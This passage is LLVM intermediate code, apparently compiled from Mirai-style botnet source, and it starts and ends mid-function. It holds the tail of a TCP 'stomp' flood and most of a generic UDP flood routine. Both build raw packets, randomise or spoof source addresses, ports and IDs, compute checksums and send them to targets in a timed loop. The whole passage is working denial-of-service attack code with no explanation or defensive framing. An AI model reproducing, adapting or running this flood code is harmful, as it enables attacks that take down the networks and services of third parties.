  store i16 %396, i16* %393, align 4
  %397 = load %struct.tcphdr*, %struct.tcphdr** %40, align 8
  %398 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %397, i32 0, i32 4
  %399 = load i16, i16* %398, align 4
  %400 = and i16 %399, -257
  %401 = or i16 %400, 256
  store i16 %401, i16* %398, align 4
  %402 = load %struct.tcphdr*, %struct.tcphdr** %40, align 8
  %403 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %402, i32 0, i32 4
  %404 = load i16, i16* %403, align 4
  %405 = and i16 %404, -4097
  %406 = or i16 %405, 4096
  store i16 %406, i16* %403, align 4
  %407 = call i32 @rand_next()
  %408 = and i32 %407, 65535
  %409 = trunc i32 %408 to i16
  %410 = load %struct.tcphdr*, %struct.tcphdr** %40, align 8
  %411 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %410, i32 0, i32 5
  store i16 %409, i16* %411, align 2
  %412 = load i8, i8* %20, align 1
  %413 = sext i8 %412 to i16
  %414 = load %struct.tcphdr*, %struct.tcphdr** %40, align 8
  %415 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %414, i32 0, i32 4
  %416 = load i16, i16* %415, align 4
  %417 = and i16 %413, 1
  %418 = shl i16 %417, 13
  %419 = and i16 %416, -8193
  %420 = or i16 %419, %418
  store i16 %420, i16* %415, align 4
  %421 = load i8, i8* %21, align 1
  %422 = sext i8 %421 to i16
  %423 = load %struct.tcphdr*, %struct.tcphdr** %40, align 8
  %424 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %423, i32 0, i32 4
  %425 = load i16, i16* %424, align 4
  %426 = and i16 %422, 1
  %427 = shl i16 %426, 12
  %428 = and i16 %425, -4097
  %429 = or i16 %428, %427
  store i16 %429, i16* %424, align 4
  %430 = load i8, i8* %22, align 1
  %431 = sext i8 %430 to i16
  %432 = load %struct.tcphdr*, %struct.tcphdr** %40, align 8
  %433 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %432, i32 0, i32 4
  %434 = load i16, i16* %433, align 4
  %435 = and i16 %431, 1
  %436 = shl i16 %435, 11
  %437 = and i16 %434, -2049
  %438 = or i16 %437, %436
  store i16 %438, i16* %433, align 4
  %439 = load i8, i8* %23, align 1
  %440 = sext i8 %439 to i16
  %441 = load %struct.tcphdr*, %struct.tcphdr** %40, align 8
  %442 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %441, i32 0, i32 4
  %443 = load i16, i16* %442, align 4
  %444 = and i16 %440, 1
  %445 = shl i16 %444, 10
  %446 = and i16 %443, -1025
  %447 = or i16 %446, %445
  store i16 %447, i16* %442, align 4
  %448 = load i8, i8* %24, align 1
  %449 = sext i8 %448 to i16
  %450 = load %struct.tcphdr*, %struct.tcphdr** %40, align 8
  %451 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %450, i32 0, i32 4
  %452 = load i16, i16* %451, align 4
  %453 = and i16 %449, 1
  %454 = shl i16 %453, 9
  %455 = and i16 %452, -513
  %456 = or i16 %455, %454
  store i16 %456, i16* %451, align 4
  %457 = load i8, i8* %25, align 1
  %458 = sext i8 %457 to i16
  %459 = load %struct.tcphdr*, %struct.tcphdr** %40, align 8
  %460 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %459, i32 0, i32 4
  %461 = load i16, i16* %460, align 4
  %462 = and i16 %458, 1
  %463 = shl i16 %462, 8
  %464 = and i16 %461, -257
  %465 = or i16 %464, %463
  store i16 %465, i16* %460, align 4
  %466 = load i8*, i8** %41, align 8
  %467 = load i32, i32* %26, align 4
  call void @rand_alphastr(i8* %466, i32 %467)
  %468 = load i8*, i8** %41, align 8
  %469 = load i32, i32* %26, align 4
  %470 = sext i32 %469 to i64
  %471 = getelementptr inbounds i8, i8* %468, i64 %470
  store i8 0, i8* %471, align 1
  br label %503

; <label>:472:                                    ; preds = %243, %235
  %473 = load %struct.tcphdr*, %struct.tcphdr** %38, align 8
  %474 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %473, i32 0, i32 4
  %475 = load i16, i16* %474, align 4
  %476 = lshr i16 %475, 8
  %477 = and i16 %476, 1
  %478 = zext i16 %477 to i32
  %479 = icmp ne i32 %478, 0
  br i1 %479, label %488, label %480

; <label>:480:                                    ; preds = %472
  %481 = load %struct.tcphdr*, %struct.tcphdr** %38, align 8
  %482 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %481, i32 0, i32 4
  %483 = load i16, i16* %482, align 4
  %484 = lshr i16 %483, 10
  %485 = and i16 %484, 1
  %486 = zext i16 %485 to i32
  %487 = icmp ne i32 %486, 0
  br i1 %487, label %488, label %491

; <label>:488:                                    ; preds = %480, %472
  %489 = load i32, i32* %29, align 4
  %490 = call i32 @close(i32 %489)
  br label %129

; <label>:491:                                    ; preds = %480
  br label %492

; <label>:492:                                    ; preds = %491
  br label %493

; <label>:493:                                    ; preds = %492, %223
  br label %494

; <label>:494:                                    ; preds = %493, %219, %211
  %495 = call i64 @time(i64* null) #6
  %496 = load i64, i64* %34, align 8
  %497 = sub nsw i64 %495, %496
  %498 = icmp sgt i64 %497, 10
  br i1 %498, label %499, label %502

; <label>:499:                                    ; preds = %494
  %500 = load i32, i32* %29, align 4
  %501 = call i32 @close(i32 %500)
  br label %129

; <label>:502:                                    ; preds = %494
  br label %199

; <label>:503:                                    ; preds = %346
  br label %504

; <label>:504:                                    ; preds = %503, %132
  %505 = load i32, i32* %11, align 4
  %506 = add nsw i32 %505, 1
  store i32 %506, i32* %11, align 4
  br label %123

; <label>:507:                                    ; preds = %123
  br label %508

; <label>:508:                                    ; preds = %628, %507
  store i32 0, i32* %11, align 4
  br label %509

; <label>:509:                                    ; preds = %619, %508
  %510 = load i32, i32* %11, align 4
  %511 = load i8, i8* %7, align 1
  %512 = zext i8 %511 to i32
  %513 = icmp slt i32 %510, %512
  br i1 %513, label %514, label %622

; <label>:514:                                    ; preds = %509
  %515 = load i8**, i8*** %14, align 8
  %516 = load i32, i32* %11, align 4
  %517 = sext i32 %516 to i64
  %518 = getelementptr inbounds i8*, i8** %515, i64 %517
  %519 = load i8*, i8** %518, align 8
  store i8* %519, i8** %42, align 8
  %520 = load i8*, i8** %42, align 8
  %521 = bitcast i8* %520 to %struct.iphdr*
  store %struct.iphdr* %521, %struct.iphdr** %43, align 8
  %522 = load %struct.iphdr*, %struct.iphdr** %43, align 8
  %523 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %522, i64 1
  %524 = bitcast %struct.iphdr* %523 to %struct.tcphdr*
  store %struct.tcphdr* %524, %struct.tcphdr** %44, align 8
  %525 = load %struct.tcphdr*, %struct.tcphdr** %44, align 8
  %526 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %525, i64 1
  %527 = bitcast %struct.tcphdr* %526 to i8*
  store i8* %527, i8** %45, align 8
  %528 = load i16, i16* %16, align 2
  %529 = zext i16 %528 to i32
  %530 = icmp eq i32 %529, 65535
  br i1 %530, label %531, label %537

; <label>:531:                                    ; preds = %514
  %532 = call i32 @rand_next()
  %533 = and i32 %532, 65535
  %534 = trunc i32 %533 to i16
  %535 = load %struct.iphdr*, %struct.iphdr** %43, align 8
  %536 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %535, i32 0, i32 3
  store i16 %534, i16* %536, align 4
  br label %537

; <label>:537:                                    ; preds = %531, %514
  %538 = load i8, i8* %27, align 1
  %539 = icmp ne i8 %538, 0
  br i1 %539, label %540, label %547

; <label>:540:                                    ; preds = %537
  %541 = load i8*, i8** %45, align 8
  %542 = load i32, i32* %26, align 4
  call void @rand_alphastr(i8* %541, i32 %542)
  %543 = load i8*, i8** %45, align 8
  %544 = load i32, i32* %26, align 4
  %545 = sext i32 %544 to i64
  %546 = getelementptr inbounds i8, i8* %543, i64 %545
  store i8 0, i8* %546, align 1
  br label %547

; <label>:547:                                    ; preds = %540, %537
  %548 = load %struct.iphdr*, %struct.iphdr** %43, align 8
  %549 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %548, i32 0, i32 7
  store i16 0, i16* %549, align 2
  %550 = load %struct.iphdr*, %struct.iphdr** %43, align 8
  %551 = bitcast %struct.iphdr* %550 to i16*
  %552 = call zeroext i16 @checksum_generic(i16* %551, i32 20)
  %553 = load %struct.iphdr*, %struct.iphdr** %43, align 8
  %554 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %553, i32 0, i32 7
  store i16 %552, i16* %554, align 2
  %555 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %13, align 8
  %556 = load i32, i32* %11, align 4
  %557 = sext i32 %556 to i64
  %558 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %555, i64 %557
  %559 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %558, i32 0, i32 1
  %560 = load i32, i32* %559, align 4
  %561 = add i32 %560, 1
  store i32 %561, i32* %559, align 4
  %562 = trunc i32 %560 to i16
  %563 = call zeroext i16 @htons(i16 zeroext %562) #7
  %564 = zext i16 %563 to i32
  %565 = load %struct.tcphdr*, %struct.tcphdr** %44, align 8
  %566 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %565, i32 0, i32 2
  store i32 %564, i32* %566, align 4
  %567 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %13, align 8
  %568 = load i32, i32* %11, align 4
  %569 = sext i32 %568 to i64
  %570 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %567, i64 %569
  %571 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %570, i32 0, i32 2
  %572 = load i32, i32* %571, align 4
  %573 = trunc i32 %572 to i16
  %574 = call zeroext i16 @htons(i16 zeroext %573) #7
  %575 = zext i16 %574 to i32
  %576 = load %struct.tcphdr*, %struct.tcphdr** %44, align 8
  %577 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %576, i32 0, i32 3
  store i32 %575, i32* %577, align 4
  %578 = load %struct.tcphdr*, %struct.tcphdr** %44, align 8
  %579 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %578, i32 0, i32 6
  store i16 0, i16* %579, align 4
  %580 = load %struct.iphdr*, %struct.iphdr** %43, align 8
  %581 = load %struct.tcphdr*, %struct.tcphdr** %44, align 8
  %582 = bitcast %struct.tcphdr* %581 to i8*
  %583 = load i32, i32* %26, align 4
  %584 = sext i32 %583 to i64
  %585 = add i64 20, %584
  %586 = trunc i64 %585 to i16
  %587 = call zeroext i16 @htons(i16 zeroext %586) #7
  %588 = load i32, i32* %26, align 4
  %589 = sext i32 %588 to i64
  %590 = add i64 20, %589
  %591 = trunc i64 %590 to i32
  %592 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* %580, i8* %582, i16 zeroext %587, i32 %591)
  %593 = load %struct.tcphdr*, %struct.tcphdr** %44, align 8
  %594 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %593, i32 0, i32 6
  store i16 %592, i16* %594, align 4
  %595 = load %struct.tcphdr*, %struct.tcphdr** %44, align 8
  %596 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %595, i32 0, i32 1
  %597 = load i16, i16* %596, align 2
  %598 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %599 = load i32, i32* %11, align 4
  %600 = sext i32 %599 to i64
  %601 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %598, i64 %600
  %602 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %601, i32 0, i32 0
  %603 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %602, i32 0, i32 1
  store i16 %597, i16* %603, align 2
  %604 = load i32, i32* %12, align 4
  %605 = load i8*, i8** %42, align 8
  %606 = load i32, i32* %26, align 4
  %607 = sext i32 %606 to i64
  %608 = add i64 40, %607
  %609 = bitcast %union.__CONST_SOCKADDR_ARG* %46 to %struct.sockaddr**
  %610 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %611 = load i32, i32* %11, align 4
  %612 = sext i32 %611 to i64
  %613 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %610, i64 %612
  %614 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %613, i32 0, i32 0
  %615 = bitcast %struct.sockaddr_in* %614 to %struct.sockaddr*
  store %struct.sockaddr* %615, %struct.sockaddr** %609, align 8
  %616 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %46, i32 0, i32 0
  %617 = load %struct.sockaddr*, %struct.sockaddr** %616, align 8
  %618 = call i64 @sendto(i32 %604, i8* %605, i64 %608, i32 16384, %struct.sockaddr* %617, i32 16)
  br label %619

; <label>:619:                                    ; preds = %547
  %620 = load i32, i32* %11, align 4
  %621 = add nsw i32 %620, 1
  store i32 %621, i32* %11, align 4
  br label %509

; <label>:622:                                    ; preds = %509
  %623 = call i64 @time(i64* null) #6
  %624 = load i32, i32* %28, align 4
  %625 = sext i32 %624 to i64
  %626 = icmp sgt i64 %623, %625
  br i1 %626, label %627, label %628

; <label>:627:                                    ; preds = %622
  br label %629

; <label>:628:                                    ; preds = %622
  br label %508

; <label>:629:                                    ; preds = %627, %210, %119, %113
  ret void
}

declare i64 @recvfrom(i32, i8*, i64, i32, %struct.sockaddr*, i32*) #3

; Function Attrs: nounwind
declare noalias i8* @malloc(i64) #1

; Function Attrs: noinline nounwind uwtable
define void @attack_udp_generic(i32, i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option*) #0 {
  %6 = alloca i32, align 4
  %7 = alloca i8, align 1
  %8 = alloca %struct.attack_target*, align 8
  %9 = alloca i8, align 1
  %10 = alloca %struct.attack_option*, align 8
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i8**, align 8
  %14 = alloca i8, align 1
  %15 = alloca i16, align 2
  %16 = alloca i8, align 1
  %17 = alloca i8, align 1
  %18 = alloca i16, align 2
  %19 = alloca i16, align 2
  %20 = alloca i16, align 2
  %21 = alloca i8, align 1
  %22 = alloca i32, align 4
  %23 = alloca i32, align 4
  %24 = alloca %struct.iphdr*, align 8
  %25 = alloca %struct.udphdr*, align 8
  %26 = alloca i8*, align 8
  %27 = alloca %struct.iphdr*, align 8
  %28 = alloca %struct.udphdr*, align 8
  %29 = alloca i8*, align 8
  %30 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  store i32 %0, i32* %6, align 4
  store i8 %1, i8* %7, align 1
  store %struct.attack_target* %2, %struct.attack_target** %8, align 8
  store i8 %3, i8* %9, align 1
  store %struct.attack_option* %4, %struct.attack_option** %10, align 8
  store i32 0, i32* %11, align 4
  store i32 0, i32* %12, align 4
  %31 = load i8, i8* %7, align 1
  %32 = zext i8 %31 to i64
  %33 = call noalias i8* @calloc(i64 %32, i64 8) #6
  %34 = bitcast i8* %33 to i8**
  store i8** %34, i8*** %13, align 8
  %35 = load i8, i8* %9, align 1
  %36 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %37 = call i32 @attack_get_opt_int(i8 zeroext %35, %struct.attack_option* %36, i8 zeroext 2, i32 0)
  %38 = trunc i32 %37 to i8
  store i8 %38, i8* %14, align 1
  %39 = load i8, i8* %9, align 1
  %40 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %41 = call i32 @attack_get_opt_int(i8 zeroext %39, %struct.attack_option* %40, i8 zeroext 3, i32 65535)
  %42 = trunc i32 %41 to i16
  store i16 %42, i16* %15, align 2
  %43 = load i8, i8* %9, align 1
  %44 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %45 = call i32 @attack_get_opt_int(i8 zeroext %43, %struct.attack_option* %44, i8 zeroext 4, i32 64)
  %46 = trunc i32 %45 to i8
  store i8 %46, i8* %16, align 1
  %47 = load i8, i8* %9, align 1
  %48 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %49 = call i32 @attack_get_opt_int(i8 zeroext %47, %struct.attack_option* %48, i8 zeroext 5, i32 0)
  %50 = trunc i32 %49 to i8
  store i8 %50, i8* %17, align 1
  %51 = load i8, i8* %9, align 1
  %52 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %53 = call i32 @attack_get_opt_int(i8 zeroext %51, %struct.attack_option* %52, i8 zeroext 6, i32 65535)
  %54 = trunc i32 %53 to i16
  store i16 %54, i16* %18, align 2
  %55 = load i8, i8* %9, align 1
  %56 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %57 = call i32 @attack_get_opt_int(i8 zeroext %55, %struct.attack_option* %56, i8 zeroext 7, i32 65535)
  %58 = trunc i32 %57 to i16
  store i16 %58, i16* %19, align 2
  %59 = load i8, i8* %9, align 1
  %60 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %61 = call i32 @attack_get_opt_int(i8 zeroext %59, %struct.attack_option* %60, i8 zeroext 0, i32 512)
  %62 = trunc i32 %61 to i16
  store i16 %62, i16* %20, align 2
  %63 = load i8, i8* %9, align 1
  %64 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %65 = call i32 @attack_get_opt_int(i8 zeroext %63, %struct.attack_option* %64, i8 zeroext 1, i32 1)
  %66 = trunc i32 %65 to i8
  store i8 %66, i8* %21, align 1
  %67 = load i8, i8* %9, align 1
  %68 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %69 = load i32, i32* @LOCAL_ADDR, align 4
  %70 = call i32 @attack_get_opt_int(i8 zeroext %67, %struct.attack_option* %68, i8 zeroext 24, i32 %69)
  store i32 %70, i32* %22, align 4
  %71 = call i64 @time(i64* null) #6
  %72 = load i32, i32* %6, align 4
  %73 = sext i32 %72 to i64
  %74 = add nsw i64 %71, %73
  %75 = trunc i64 %74 to i32
  store i32 %75, i32* %23, align 4
  %76 = load i16, i16* %20, align 2
  %77 = zext i16 %76 to i32
  %78 = icmp sgt i32 %77, 1460
  br i1 %78, label %79, label %80

; <label>:79:                                     ; preds = %5
  store i16 1460, i16* %20, align 2
  br label %80

; <label>:80:                                     ; preds = %79, %5
  %81 = call i32 @socket(i32 2, i32 3, i32 17) #6
  store i32 %81, i32* %12, align 4
  %82 = icmp eq i32 %81, -1
  br i1 %82, label %83, label %84

; <label>:83:                                     ; preds = %80
  br label %330

; <label>:84:                                     ; preds = %80
  store i32 1, i32* %11, align 4
  %85 = load i32, i32* %12, align 4
  %86 = bitcast i32* %11 to i8*
  %87 = call i32 @setsockopt(i32 %85, i32 0, i32 3, i8* %86, i32 4) #6
  %88 = icmp eq i32 %87, -1
  br i1 %88, label %89, label %92

; <label>:89:                                     ; preds = %84
  %90 = load i32, i32* %12, align 4
  %91 = call i32 @close(i32 %90)
  br label %330

; <label>:92:                                     ; preds = %84
  store i32 0, i32* %11, align 4
  br label %93

; <label>:93:                                     ; preds = %175, %92
  %94 = load i32, i32* %11, align 4
  %95 = load i8, i8* %7, align 1
  %96 = zext i8 %95 to i32
  %97 = icmp slt i32 %94, %96
  br i1 %97, label %98, label %178

; <label>:98:                                     ; preds = %93
  %99 = call noalias i8* @calloc(i64 1510, i64 1) #6
  %100 = load i8**, i8*** %13, align 8
  %101 = load i32, i32* %11, align 4
  %102 = sext i32 %101 to i64
  %103 = getelementptr inbounds i8*, i8** %100, i64 %102
  store i8* %99, i8** %103, align 8
  %104 = load i8**, i8*** %13, align 8
  %105 = load i32, i32* %11, align 4
  %106 = sext i32 %105 to i64
  %107 = getelementptr inbounds i8*, i8** %104, i64 %106
  %108 = load i8*, i8** %107, align 8
  %109 = bitcast i8* %108 to %struct.iphdr*
  store %struct.iphdr* %109, %struct.iphdr** %24, align 8
  %110 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %111 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %110, i64 1
  %112 = bitcast %struct.iphdr* %111 to %struct.udphdr*
  store %struct.udphdr* %112, %struct.udphdr** %25, align 8
  %113 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %114 = bitcast %struct.iphdr* %113 to i8*
  %115 = load i8, i8* %114, align 4
  %116 = and i8 %115, 15
  %117 = or i8 %116, 64
  store i8 %117, i8* %114, align 4
  %118 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %119 = bitcast %struct.iphdr* %118 to i8*
  %120 = load i8, i8* %119, align 4
  %121 = and i8 %120, -16
  %122 = or i8 %121, 5
  store i8 %122, i8* %119, align 4
  %123 = load i8, i8* %14, align 1
  %124 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %125 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %124, i32 0, i32 1
  store i8 %123, i8* %125, align 1
  %126 = load i16, i16* %20, align 2
  %127 = zext i16 %126 to i64
  %128 = add i64 28, %127
  %129 = trunc i64 %128 to i16
  %130 = call zeroext i16 @htons(i16 zeroext %129) #7
  %131 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %132 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %131, i32 0, i32 2
  store i16 %130, i16* %132, align 2
  %133 = load i16, i16* %15, align 2
  %134 = call zeroext i16 @htons(i16 zeroext %133) #7
  %135 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %136 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %135, i32 0, i32 3
  store i16 %134, i16* %136, align 4
  %137 = load i8, i8* %16, align 1
  %138 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %139 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %138, i32 0, i32 5
  store i8 %137, i8* %139, align 4
  %140 = load i8, i8* %17, align 1
  %141 = icmp ne i8 %140, 0
  br i1 %141, label %142, label %146

; <label>:142:                                    ; preds = %98
  %143 = call zeroext i16 @htons(i16 zeroext 16384) #7
  %144 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %145 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %144, i32 0, i32 4
  store i16 %143, i16* %145, align 2
  br label %146

; <label>:146:                                    ; preds = %142, %98
  %147 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %148 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %147, i32 0, i32 6
  store i8 17, i8* %148, align 1
  %149 = load i32, i32* %22, align 4
  %150 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %151 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %150, i32 0, i32 8
  store i32 %149, i32* %151, align 4
  %152 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %153 = load i32, i32* %11, align 4
  %154 = sext i32 %153 to i64
  %155 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %152, i64 %154
  %156 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %155, i32 0, i32 1
  %157 = load i32, i32* %156, align 4
  %158 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %159 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %158, i32 0, i32 9
  store i32 %157, i32* %159, align 4
  %160 = load i16, i16* %18, align 2
  %161 = call zeroext i16 @htons(i16 zeroext %160) #7
  %162 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %163 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %162, i32 0, i32 0
  store i16 %161, i16* %163, align 2
  %164 = load i16, i16* %19, align 2
  %165 = call zeroext i16 @htons(i16 zeroext %164) #7
  %166 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %167 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %166, i32 0, i32 1
  store i16 %165, i16* %167, align 2
  %168 = load i16, i16* %20, align 2
  %169 = zext i16 %168 to i64
  %170 = add i64 8, %169
  %171 = trunc i64 %170 to i16
  %172 = call zeroext i16 @htons(i16 zeroext %171) #7
  %173 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %174 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %173, i32 0, i32 2
  store i16 %172, i16* %174, align 2
  br label %175

; <label>:175:                                    ; preds = %146
  %176 = load i32, i32* %11, align 4
  %177 = add nsw i32 %176, 1
  store i32 %177, i32* %11, align 4
  br label %93

; <label>:178:                                    ; preds = %93
  br label %179

; <label>:179:                                    ; preds = %329, %178
  store i32 0, i32* %11, align 4
  br label %180

; <label>:180:                                    ; preds = %320, %179
  %181 = load i32, i32* %11, align 4
  %182 = load i8, i8* %7, align 1
  %183 = zext i8 %182 to i32
  %184 = icmp slt i32 %181, %183
  br i1 %184, label %185, label %323

; <label>:185:                                    ; preds = %180
  %186 = load i8**, i8*** %13, align 8
  %187 = load i32, i32* %11, align 4
  %188 = sext i32 %187 to i64
  %189 = getelementptr inbounds i8*, i8** %186, i64 %188
  %190 = load i8*, i8** %189, align 8
  store i8* %190, i8** %26, align 8
  %191 = load i8*, i8** %26, align 8
  %192 = bitcast i8* %191 to %struct.iphdr*
  store %struct.iphdr* %192, %struct.iphdr** %27, align 8
  %193 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %194 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %193, i64 1
  %195 = bitcast %struct.iphdr* %194 to %struct.udphdr*
  store %struct.udphdr* %195, %struct.udphdr** %28, align 8
  %196 = load %struct.udphdr*, %struct.udphdr** %28, align 8
  %197 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %196, i64 1
  %198 = bitcast %struct.udphdr* %197 to i8*
  store i8* %198, i8** %29, align 8
  %199 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %200 = load i32, i32* %11, align 4
  %201 = sext i32 %200 to i64
  %202 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %199, i64 %201
  %203 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %202, i32 0, i32 2
  %204 = load i8, i8* %203, align 4
  %205 = zext i8 %204 to i32
  %206 = icmp slt i32 %205, 32
  br i1 %206, label %207, label %228

; <label>:207:                                    ; preds = %185
  %208 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %209 = load i32, i32* %11, align 4
  %210 = sext i32 %209 to i64
  %211 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %208, i64 %210
  %212 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %211, i32 0, i32 1
  %213 = load i32, i32* %212, align 4
  %214 = call i32 @ntohl(i32 %213) #7
  %215 = call i32 @rand_next()
  %216 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %217 = load i32, i32* %11, align 4
  %218 = sext i32 %217 to i64
  %219 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %216, i64 %218
  %220 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %219, i32 0, i32 2
  %221 = load i8, i8* %220, align 4
  %222 = zext i8 %221 to i32
  %223 = lshr i32 %215, %222
  %224 = add i32 %214, %223
  %225 = call i32 @htonl(i32 %224) #7
  %226 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %227 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %226, i32 0, i32 9
  store i32 %225, i32* %227, align 4
  br label %228

; <label>:228:                                    ; preds = %207, %185
  %229 = load i32, i32* %22, align 4
  %230 = icmp eq i32 %229, -1
  br i1 %230, label %231, label %235

; <label>:231:                                    ; preds = %228
  %232 = call i32 @rand_next()
  %233 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %234 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %233, i32 0, i32 8
  store i32 %232, i32* %234, align 4
  br label %235

; <label>:235:                                    ; preds = %231, %228
  %236 = load i16, i16* %15, align 2
  %237 = zext i16 %236 to i32
  %238 = icmp eq i32 %237, 65535
  br i1 %238, label %239, label %244

; <label>:239:                                    ; preds = %235
  %240 = call i32 @rand_next()
  %241 = trunc i32 %240 to i16
  %242 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %243 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %242, i32 0, i32 3
  store i16 %241, i16* %243, align 4
  br label %244

; <label>:244:                                    ; preds = %239, %235
  %245 = load i16, i16* %18, align 2
  %246 = zext i16 %245 to i32
  %247 = icmp eq i32 %246, 65535
  br i1 %247, label %248, label %253

; <label>:248:                                    ; preds = %244
  %249 = call i32 @rand_next()
  %250 = trunc i32 %249 to i16
  %251 = load %struct.udphdr*, %struct.udphdr** %28, align 8
  %252 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %251, i32 0, i32 0
  store i16 %250, i16* %252, align 2
  br label %253

; <label>:253:                                    ; preds = %248, %244
  %254 = load i16, i16* %19, align 2
  %255 = zext i16 %254 to i32
  %256 = icmp eq i32 %255, 65535
  br i1 %256, label %257, label %262

; <label>:257:                                    ; preds = %253
  %258 = call i32 @rand_next()
  %259 = trunc i32 %258 to i16
  %260 = load %struct.udphdr*, %struct.udphdr** %28, align 8
  %261 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %260, i32 0, i32 1
  store i16 %259, i16* %261, align 2
  br label %262

; <label>:262:                                    ; preds = %257, %253
  %263 = load i8, i8* %21, align 1
  %264 = icmp ne i8 %263, 0
  br i1 %264, label %265, label %273

; <label>:265:                                    ; preds = %262
  %266 = load i8*, i8** %29, align 8
  %267 = load i16, i16* %20, align 2
  %268 = zext i16 %267 to i32
  call void @rand_alphastr(i8* %266, i32 %268)
  %269 = load i8*, i8** %29, align 8
  %270 = load i16, i16* %20, align 2
  %271 = zext i16 %270 to i64
  %272 = getelementptr inbounds i8, i8* %269, i64 %271
  store i8 0, i8* %272, align 1
  br label %273

; <label>:273:                                    ; preds = %265, %262
  %274 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %275 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %274, i32 0, i32 7
  store i16 0, i16* %275, align 2
  %276 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %277 = bitcast %struct.iphdr* %276 to i16*
  %278 = call zeroext i16 @checksum_generic(i16* %277, i32 20)
  %279 = load %struct.iphdr*, %struct.iphdr** %27, align 8
